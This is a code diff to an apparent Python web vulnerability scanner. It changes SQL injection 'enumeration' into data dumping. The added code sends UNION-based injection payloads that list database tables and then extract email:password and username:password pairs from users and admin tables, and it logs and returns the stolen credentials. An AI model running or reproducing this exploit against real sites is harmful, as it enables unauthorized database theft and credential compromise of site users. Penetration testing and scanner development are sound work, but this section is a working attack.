@@ -38,6 +38,7 @@ class VulnerabilityFinding:
     payload: Optional[str] = None
     evidence: Optional[str] = None
     db_structure: Optional[str] = None
+    dumped_data: Optional[str] = None
     request: Optional[Dict[str, Any]] = None
     response: Optional[Dict[str, Any]] = None
     recommendations: List[str] = field(default_factory=list)
@@ -58,6 +59,7 @@ class VulnerabilityFinding:
             'payload': self.payload,
             'evidence': self.evidence[:500] if self.evidence else None,
             'db_structure': self.db_structure,
+            'dumped_data': self.dumped_data,
             'recommendations': self.recommendations,
             'timestamp': self.timestamp.isoformat(),
             'confidence': self.confidence,
@@ -1067,55 +1069,120 @@ class EnhancedScanner:
     
     async def _enumerate_database(self, url: str, param: str, method: str = 'GET', db_type: str = 'sqlite') -> Optional[str]:
         """
-        Try to enumerate database structure after finding SQLi vulnerability.
+        Try to enumerate database structure and dump data after finding SQLi vulnerability.
         
-        Returns extracted database schema information if successful.
+        Returns extracted database schema and data if successful.
         """
-        self._log(f"Attempting database enumeration ({db_type})...", "info")
+        self._log(f"Attempting database enumeration & dump ({db_type})...", "info")
         
-        payloads = self.DB_ENUM_PAYLOADS.get(db_type, self.DB_ENUM_PAYLOADS['generic'])
         extracted_info = []
+        
+        # First, get table names
+        table_payloads = {
+            'sqlite': [
+                "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'--",
+                "' UNION SELECT group_concat(tbl_name) FROM sqlite_master--",
+                "1' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'--",
+            ],
+            'generic': [
+                "' UNION SELECT group_concat(table_name) FROM information_schema.tables--",
+                "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
+            ]
+        }
+        
+        table_names = []
+        payloads = table_payloads.get(db_type, table_payloads['generic'])
         
         for payload in payloads:
             try:
-                if method == 'POST':
-                    # For JSON APIs
-                    parsed = urlparse(url)
-                    data = {param: payload}
+                html = await self._execute_sqli_payload(url, param, payload, method)
+                # Extract table names from response
+                # Look for comma-separated values or table names
+                table_pattern = r'(?:users?|admins?|products?|orders?|customers?|accounts?|sessions?|tokens?|posts?|comments?|articles?|categories?|permissions?|roles?)'
+                matches = re.findall(table_pattern, html, re.IGNORECASE)
+                table_names.extend(matches)
+                
+                # Also look for explicit comma-separated values
+                if ',' in html and len(html) < 2000:  # Likely a data dump
+                    extracted_info.append(f"[Tables Enumeration]\n{html[:500]}")
+                    break
                     
-                    async with self._semaphore:
-                        async with self._session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                            html = await response.text()
-                            self.progress.requests_made += 1
-                else:
-                    test_url = self._inject_into_url(url, param, payload)
-                    async with self._semaphore:
-                        async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                            html = await response.text()
-                            self.progress.requests_made += 1
-                
-                # Look for table names, column info in response
-                # SQLite master patterns
-                table_patterns = [
-                    r'CREATE TABLE[^;]+',
-                    r'(?:Users?|Admins?|Products?|Orders?|Customers?|Accounts?|Sessions?|Tokens?)',
-                    r'"(?:id|name|email|password|username|token|hash)"',
-                ]
-                
-                for pattern in table_patterns:
-                    matches = re.findall(pattern, html, re.IGNORECASE)
-                    if matches:
-                        for match in matches[:5]:  # Limit matches
-                            if match not in extracted_info and len(match) > 3:
-                                extracted_info.append(match)
-                                self._log(f"  Found: {match[:50]}...", "info")
-                
             except Exception as e:
-                logger.debug(f"DB enum error: {e}")
+                logger.debug(f"Table enum error: {e}")
+        
+        table_names = list(set(table_names))
+        self._log(f"  Found {len(table_names)} tables: {', '.join(table_names[:10])}", "info")
+        
+        # Extract schema for each table
+        if table_names:
+            extracted_info.append(f"[Database Tables]\n{', '.join(table_names[:15])}\n")
+        
+        # Try to dump data from common tables
+        common_tables = ['users', 'user', 'admin', 'accounts', 'products', 'orders', 'customers']
+        data_payloads = {
+            'sqlite': [
+                "' UNION SELECT group_concat(email||':'||password) FROM users--",
+                "' UNION SELECT group_concat(email||','||password) FROM users--",
+                "' UNION SELECT group_concat(username||':'||password) FROM users--",
+                "' UNION SELECT group_concat(id||','||name||','||email) FROM users--",
+                "' UNION SELECT group_concat(name||':'||email) FROM users--",
+                "1' UNION SELECT 1,group_concat(email||':'||password),3 FROM users--",
+                "1' UNION SELECT 1,group_concat(username||':'||password),3 FROM admin--",
+            ],
+            'generic': [
+                "' UNION SELECT group_concat(email,':',password) FROM users--",
+                "' UNION SELECT group_concat(username,':',password) FROM admin--",
+            ]
+        }
+        
+        data_payloads_for_db = data_payloads.get(db_type, data_payloads['generic'])
+        
+        extracted_data = []
+        for payload in data_payloads_for_db:
+            try:
+                html = await self._execute_sqli_payload(url, param, payload, method)
+                
+                # Look for email/password patterns or key:value pairs
+                if '@' in html or ':' in html or ',' in html:
+                    # Clean up the response
+                    data_snippet = html.strip()
+                    if len(data_snippet) > 10:
+                        extracted_data.append(data_snippet[:300])
+                        self._log(f"  ✓ Extracted data: {data_snippet[:100]}...", "success")
+                        # Only try first few payloads that work
+                        if len(extracted_data) >= 3:
+                            break
+                        
+            except Exception as e:
+                logger.debug(f"Data dump error: {e}")
+        
+        if extracted_data:
+            extracted_info.append(f"\n[Extracted Data]\n" + "\n".join(extracted_data[:5]))
         
         if extracted_info:
-            return "\\n".join(extracted_info[:20])  # Return up to 20 items
+            result = "\n".join(extracted_info[:15])
+            self._log(f"  Successfully dumped {len(extracted_data)} data items", "success")
+            return result
+        
         return None
+    
+    async def _execute_sqli_payload(self, url: str, param: str, payload: str, method: str = 'GET') -> str:
+        """Execute a SQLi payload and return the response HTML."""
+        try:
+            if method == 'POST':
+                json_data = {param: payload}
+                headers = {'Content-Type': 'application/json'}
+                async with self._session.post(url, json=json_data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                    self.progress.requests_made += 1
+                    return await response.text()
+            else:
+                test_url = self._inject_into_url(url, param, payload)
+                async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                    self.progress.requests_made += 1
+                    return await response.text()
+        except Exception as e:
+            logger.debug(f"Payload execution error: {e}")
+            return ""
     
     async def _test_csrf_all_pages(self, pages: List[str]) -> List[VulnerabilityFinding]:
         """Test for CSRF vulnerabilities across all discovered pages."""
